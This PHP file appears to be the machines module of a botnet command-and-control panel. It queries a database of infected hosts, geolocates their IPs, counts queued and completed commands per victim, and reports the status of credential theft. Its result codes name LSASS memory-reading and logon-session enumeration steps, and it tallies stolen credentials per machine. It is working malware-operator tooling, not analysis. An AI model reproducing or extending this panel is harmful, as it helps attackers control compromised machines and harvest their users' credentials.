<?php
/*
	mod_ajax_mmachines.php
*/

	require_once 'mod_ajax_misc.php';
	require_once 'ip2location.class.php';
	require_once 'mod_db.php';

// c_flags definitions
define('ICF_PLATFORM_X64', 					1);
define('ICF_BUILD_X64', 					1<<1);
define('ICF_MACHINE_HAS_INTERNET_ACCESS', 	1<<2);
define('ICF_TRANSPORT_INIT_FINISHED', 		1<<3);


// translates result code and last error into creds scan text result
function lp_state_to_string($res, $le)
{
	// check for empty values, indicating no record exist yet
	if (($res=='') || ($le='')) { return '-'; }

	// check for ok result
 	if (intval($res)==1) { return 'ok'; }

	$res_codes = array(
		'LPR_NO_RESULT',
		'LPR_DONE_OK',
		'LPR_UNSPECIFIED_ERROR',
		'LPR_NO_DEBUG_PRIVILEGES',
		'LPR_GET_OS_VERSION_FAIL',
		'LPR_LSASRV_LOAD_FAILED',
		'LPR_RSAENH_LOAD_FAILED',
		'LPR_LSASS_GETPID_FAILED',
		'LPR_LSASS_OPEN_FAILED',
		'LPR_LSASS_GETMODULES_FAILED',
		'LPR_LSASS_READ_KEYS_FAILED',
		'LPR_SECUR32_LOAD_FAILED',
		'LPR_SECUR32_IMPORT_RESOLVE_FAILED',
		'LPR_LSAGETLOGONSESSIONDATA_FAILED',
		'LPR_LSA_ENUMERATELOGONSESSIONS_FAILED'
	);

	// check for out-of-range codes
	if (!isset($res_codes[intval($res)])) { return 'E_UNK='.strval(intval($res)).' '.$le; }
	return $res_codes[intval($res)].' '.$le;
}


// machines page module
function mMachines($ts, $mod_id)
{
	global $g_dblink;


	// check for special queries
	if (isset($_POST['jeid'])) {

		// for this module, 2 jedit types are defined:
		// bN for cli.memo and lN for vbuilds_memo.memo
		$prefix = substr($_POST['jeid'], 0, 1);
		$id = intval(substr($_POST['jeid'], 1));

		switch ($prefix) {
			case 'b': mParseJeditMemo('cli', FALSE, $id); break;		    case 'l': mParseJeditMemo('vbuilds_memo', FALSE, $id); break;
			default: exit;

		}  // prefix switch

		exit;

	}	// $_POST['jeid'] set

	// form query
    $sql = "SELECT 	`cli`.`id`,
    				`cli`.`ip`,
		    		DATE_FORMAT(`cli`.`stamp`, '%d/%m %H:%i') AS `stamp`,
		    		UNIX_TIMESTAMP(`cli`.`stamp`) AS `ts`,
		    		UNIX_TIMESTAMP(`cli`.`lastcmd_stamp`) AS `lc_ts`,
		    		(UNIX_TIMESTAMP(NOW()) - UNIX_TIMESTAMP(`cli`.`stamp`)) AS `ts_ago`,
		    		`cli`.`mid`,
		    		`cli`.`l_ticks`,
		    		DATE_FORMAT(`cli`.`l_ft`, '%d/%m %H:%i') AS `l_ft`,
		    		`cli`.`tz_name`,
		    		`cli`.`tz_bias`,
		    		`cli`.`m_name`,
		    		`cli`.`d_name`,
		    		`cli`.`memo`,
		    		`cli`.`arch`,
		    		`cli`.`c_flags` AS `cf`,
		    		`cli`.`v_build` AS `blid`,
		    		`lp_last_results`.`res` AS `lp_res`,
		    		`lp_last_results`.`le` AS `lp_le`,
		    		`vbuilds_memo`.`memo` AS `vmemo`,
		    		(SELECT COUNT(*) FROM `cmds_list` WHERE `cmds_list`.`target_id` = `cli`.`id` AND `cmds_list`.`is_done` = 0 ) AS `c_a`,
		    		(SELECT COUNT(*) FROM `cmds_list` WHERE `cmds_list`.`target_id` = `cli`.`id` AND `cmds_list`.`is_done` > 0 ) AS `c_d`,
		    		(SELECT COUNT(*) FROM `creds` WHERE `creds`.`src_id`=`cli`.`id`) AS `c_cr`
    		FROM `cli`
    		LEFT JOIN `vbuilds_memo` ON `cli`.`v_build`=`vbuilds_memo`.`id`
    		LEFT JOIN `lp_last_results` ON `cli`.`id`=`lp_last_results`.`id`";

	// if ts passed, append it to query
	if ($ts) { $sql .= " WHERE (`cli`.`stamp` > FROM_UNIXTIME({$ts})) OR (`cli`.`lastcmd_stamp` > FROM_UNIXTIME({$ts}))";  }

	$answer = array();
	$answer['r'] = array();

	// init geo2ip
	$gip = new ip2location;
	$gip->open('geo.bin');

 	if (!($res = mysqli_query($g_dblink, $sql))) { errExit("db query error: ".mysqli_error($g_dblink)); }
    $max_ts = 0;
	while ($row = mysqli_fetch_assoc($res)) {

		// translate some values
		$row['l_ticks'] = ticks2string($row['l_ticks']);
		$row['ts_ago'] = ticks2string($row['ts_ago']*100, TRUE);
		$row['tz'] = $row['tz_name'].'<br>'.bias2string($row['tz_bias']);

		$row['cst'] = '';
		if ( ($row['c_a']>0) || ($row['c_d']>0) ) { $row['cst'] = "{$row['c_a']} / {$row['c_d']}"; }
		unset($row['c_a']);  unset($row['c_d']);

		$row['ipc'] = ips2city($row['ip'], $gip);
		unset($row['ip']);

		$max_ts = max($max_ts, $row['ts'], $row['lc_ts']);
		unset($row['lc_ts']);

		// cs - creds state according to lp_last_results table
		$row['cs'] = lp_state_to_string($row['lp_res'], $row['lp_le']);
		unset($row['lp_res']); unset($row['lp_le']);

		// append found creds count to the same row
		if ($row['c_cr']>0) { $row['cs'].="<span class='badge'>{$row['c_cr']}</span>"; }
		unset($row['c_cr']);

		// platforms mismatch warning check (arch field modification)
		$bPlatformX64 = (($row['cf'] & ICF_PLATFORM_X64)==ICF_PLATFORM_X64?TRUE:FALSE);
        $bBuildX64 = (($row['cf'] & ICF_BUILD_X64)==ICF_BUILD_X64?TRUE:FALSE);
        $bHasInetAccess = (($row['cf'] & ICF_MACHINE_HAS_INTERNET_ACCESS)==ICF_MACHINE_HAS_INTERNET_ACCESS?TRUE:FALSE);
        $bTransportInited = (($row['cf'] & ICF_TRANSPORT_INIT_FINISHED)==ICF_TRANSPORT_INIT_FINISHED?TRUE:FALSE);
		$archs = array('x32', 'x64');

        if ($bPlatformX64 != $bBuildX64) {        	$row['arch'] = "<b>code={$archs[$bBuildX64]}, platform={$archs[$bPlatformX64]}</b>";
        }

        if ($bTransportInited) {        	if (!$bHasInetAccess) { $row['arch'] .= " no_inet";  }
        } else { $row['arch'] .= " t_i"; }

		$answer['r'][] = $row;

	    unset($row);
	} // while more rows

	$answer['c'] = count($answer['r']);
	$answer['ts'] = $max_ts;

	// q-log check
	//$row = mysqli_fetch_assoc(mysqli_query($g_dblink, "SELECT COUNT(*) AS `cnt` FROM `q_log`;"));
	//$answer['qc'] = intval($row['cnt']);

	// all modules count assign
	$answer['mc'] = mCountsQuery();

	// current module id
	$answer['m'] = $mod_id;

	echo json_encode($answer);
	exit;
}


/*
  	Ajax query for bids array with ids, amount, description records
    Used to query actual list before displaying dropdown menu for bid filter interface
*/
function qGetBidsInfo()
{
	global $g_dblink;
  	$answer = array();
  	$answer['bids'] = array();

	// issue query
    if (!($res = mysqli_query($g_dblink, "SELECT DISTINCT(`cli`.`v_build`), COUNT(*) AS `v_cnt`, `vbuilds_memo`.`memo` FROM `cli`
										  LEFT JOIN `vbuilds_memo` ON `cli`.`v_build`=`vbuilds_memo`.`id`;"))) { errExit("db query error: ".mysqli_error($g_dblink)); }

	while ($row = mysqli_fetch_assoc($res)) { $answer['bids'][] = array($row['v_build'], $row['v_cnt'], $row['memo']); }

	echo json_encode($answer);
	exit;
}


?>